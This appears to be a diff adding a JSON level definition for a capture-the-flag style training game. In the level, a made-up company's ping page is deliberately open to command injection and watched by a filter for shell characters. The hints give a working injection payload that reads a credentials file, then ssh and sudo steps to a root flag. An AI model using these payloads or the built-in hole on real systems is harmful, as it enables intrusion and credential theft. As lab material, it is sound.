@@ -1,0 +1,34 @@
+{
+    "base": "05-injection-point",
+    "id": "injection-watched",
+    "title": "Injection, Watched",
+    "category": "defender",
+    "defender": "watch",
+    "level": "Intermediate",
+    "order": 3,
+    "summary": "The leaky ping tool from The Injection Point, now behind a watcher that flags any web request with shell characters in it. You get two tricks before it notices - make the first one count.",
+    "story": "Juniper Health (made up) added a filter that reads app01's web log (10.10.5.30) and flags requests carrying shell characters like ; | or $( - the signs of command injection. It lets the odd one slide, but not a string of them. You start on scout.",
+    "goal": "Capture both flags with as few injected requests as possible, without raising the alarm.",
+    "skills": "reading a page for clues, one well-aimed command injection, ssh, sudo -l, staying quiet",
+    "quietPoints": 110,
+    "watch": [ "app01" ],
+    "noisySolution": "noisy.txt",
+    "defenderRules": {
+        "count": { "web-command": 4, "web-scan": 5, "web-traversal": 4, "login-failed": 3, "password-guessing": 6 },
+        "budget": 9, "window": 1500, "react": 120, "reset": false, "isolate": false,
+        "watches": "web requests with shell characters in them (command tricks), page-guessing sweeps and failed sign-ins"
+    },
+    "web": [
+        { "machine": "app01", "path": "/tools/ping", "kind": "cmd", "param": "host", "runAs": "apache", "title": "NetCheck Lite - ping a host",
+          "template": "echo 'Pinging {}'; echo '(NetCheck Lite runs: ping -c1 {} )'", "body": "<h1>NetCheck Lite</h1><p>Check a host: <a href=\"/tools/ping?host=127.0.0.1\">/tools/ping?host=127.0.0.1</a></p>" },
+        { "machine": "app01", "path": "/", "kind": "page", "title": "Juniper Health Tools",
+          "body": "<h1>Juniper Health internal tools</h1><ul><li><a href=\"/tools/ping?host=127.0.0.1\">Network ping</a></li><li><a href=\"/about.html\">About these tools</a></li></ul>" },
+        { "machine": "app01", "path": "/about.html", "kind": "page", "title": "About NetCheck Lite",
+          "body": "<h1>About NetCheck Lite</h1><p>NetCheck Lite 1.0. It signs in to other servers as the service account appsvc.</p><p>Settings (service account and password) live in /var/www/conf/app.ini - only IT should edit that file.</p>" }
+    ],
+    "hints": [
+        { "text": "Each injected request (a ; or | in the host) is counted heavily; two are tolerated, three are not. Before you inject anything, read the site's ordinary pages - one of them says where the service account's settings live.", "cost": 10 },
+        { "text": "curl -s http://10.10.5.30/about.html names /var/www/conf/app.ini. Then a single injection reads it: curl -s 'http://10.10.5.30/tools/ping?host=x;cat /var/www/conf/app.ini'. No need for ;id or ;ls first.", "cost": 16 },
+        { "text": "ssh appsvc@10.10.5.30 with the password from app.ini (once, typed right), cat flag.txt, sudo -l, then sudo sed -n p /root/flag.txt. This watcher only reads the web log, so sudo is fine here.", "cost": 24 }
+    ]
+}
